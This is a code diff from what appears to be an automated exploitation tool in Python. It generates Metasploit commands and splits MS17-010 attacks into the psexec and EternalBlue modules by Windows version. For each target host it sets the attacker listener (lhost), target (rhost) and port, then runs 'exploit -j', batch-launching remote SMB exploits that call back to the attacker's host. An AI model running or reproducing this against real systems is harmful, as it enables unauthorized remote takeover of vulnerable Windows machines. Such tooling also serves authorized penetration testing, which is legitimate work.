@@ -18,12 +18,25 @@ def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
             port += 1
             commands.append('exploit -j')
 
-    if len(exploit_dict['ms17-010']) > 0:
+    # Better for Win XP & 2000
+    if len(exploit_dict['ms17-010-psexec']) > 0:
         commands.append('use exploit/windows/smb/ms17_010_psexec')
         if lhost:
             commands.append('set lhost {0}'.format(lhost))
 
-        for host in exploit_dict['ms17-010']:
+        for host in exploit_dict['ms17-010-psexec']:
+            commands.append('set rhost {0}'.format(host))
+            commands.append('set lport {0}'.format(port))
+            port += 1
+            commands.append('exploit -j')
+
+    # Better for Win Vista+
+    if len(exploit_dict['ms17-010-eternalblue']) > 0:
+        commands.append('use exploit/windows/smb/ms17_010_eternalblue')
+        if lhost:
+            commands.append('set lhost {0}'.format(lhost))
+
+        for host in exploit_dict['ms17-010-eternalblue']:
             commands.append('set rhost {0}'.format(host))
             commands.append('set lport {0}'.format(port))
             port += 1
